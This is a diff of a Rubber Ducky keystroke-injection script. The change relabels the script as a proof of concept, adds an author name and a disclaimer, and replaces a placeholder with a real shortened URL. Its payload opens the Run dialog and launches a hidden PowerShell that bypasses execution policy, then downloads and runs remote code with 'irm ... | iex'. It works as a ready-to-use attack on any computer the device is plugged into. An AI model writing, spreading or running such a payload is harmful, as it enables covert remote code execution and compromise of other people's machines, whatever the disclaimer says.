@@ -1,5 +1,5 @@
-REM Title: W1ns1d3r_f4st_Tr3ll0
-REM Author: 
+REM Title: RubberDucky_PoC
+REM Author: b1g_ph4rm4
 REM
 REM ______________________________________________________________________________________________
 REM 
@@ -17,13 +17,14 @@ REM                 "Y88P"           888
 REM ______________________________________________________________________________________________
 REM
 REM
-REM You just need to put your variables into this txt script. 
+REM Plug & Play Script
 REM
-REM If you don't know how to get those, make sure you check the readme.md file at this link : https://shorturl.at/kuOR6
-REM
+REM This script is made to demonstrate what a rubber ducky can do once plugged into the PC. 
+REM Make sure you don't use this script with malevolent intentions and only on systems you have permission to run this onto.
+REM The author cannot be held responsible for any bad use of this script
 REM ______________________________________________________________________________________________
 DELAY 2000
 GUI r
 DELAY 1000
-STRING powershell -w h -NoP -Ep Bypass irm SHORTED_URL | iex
+STRING powershell -w h -NoP -Ep Bypass irm https://shorturl.at/CmoDf | iex
 ENTER
